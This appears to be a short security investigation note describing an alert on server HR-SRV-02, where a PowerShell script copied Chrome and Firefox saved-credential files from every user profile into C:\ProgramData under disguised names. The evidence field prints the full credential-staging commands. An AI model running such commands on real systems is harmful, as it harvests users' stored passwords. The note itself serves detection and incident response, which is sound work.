investigation_notes.Description: An unusual PowerShell script executed on HR-SRV-02 attempts to copy browser credential stores (Chrome Login Data and Firefox logins.json) to C:\ProgramData. The command uses wildcards to target multiple user profiles, indicating credential access or data exfiltration attempts. This combination of actions, if not part of a sanctioned process, elevates the risk of credential harvesting and data compromise.
investigation_notes.Evidence Scriptblock: Copy-Item 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data' -Destination C:\ProgramData\chrome_cache.db -Force; Copy-Item 'C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json' -Destination C:\ProgramData\ff_cache.json -Force
